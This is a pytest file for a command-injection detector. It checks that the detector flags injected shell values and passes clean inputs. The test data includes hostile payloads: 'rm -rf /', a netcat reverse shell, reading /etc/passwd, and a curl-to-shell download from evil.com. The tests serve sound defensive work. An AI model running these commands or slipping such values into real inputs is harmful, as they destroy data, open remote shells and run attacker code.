from detectors.command_injection import detect


def test_detect_semicolon_rm():
    data = {"payload": "file=test; rm -rf /"}
    result = detect(data)
    assert result is not None
    assert result["attack_type"] == "Command Injection"
    assert result["confidence"] == "Very High"
    assert result["mitre_technique"] == "T1059"


def test_detect_pipe_nc():
    data = {"payload": "url=http://x|nc -e /bin/sh 4444"}
    result = detect(data)
    assert result is not None
    assert result["attack_type"] == "Command Injection"


def test_detect_backtick():
    data = {"payload": "name=`whoami`"}
    result = detect(data)
    assert result is not None
    assert result["attack_type"] == "Command Injection"
    assert "backtick" in result["evidence"].lower()


def test_detect_dollar_paren():
    data = {"payload": "input=$(cat /etc/passwd)"}
    result = detect(data)
    assert result is not None
    assert result["attack_type"] == "Command Injection"


def test_detect_and_curl():
    data = {"payload": "q=test && curl http://evil.com/shell.sh | sh"}
    result = detect(data)
    assert result is not None
    assert result["attack_type"] == "Command Injection"


def test_no_false_positive_clean_input():
    data = {"payload": "filename=myfile.txt;author=john"}
    result = detect(data)
    assert result is None


def test_no_false_positive_email():
    data = {"payload": "email=user@example.com"}
    result = detect(data)
    assert result is None


def test_no_false_positive_empty():
    data = {"payload": ""}
    result = detect(data)
    assert result is None


def test_no_false_positive_missing():
    data = {}
    result = detect(data)
    assert result is None
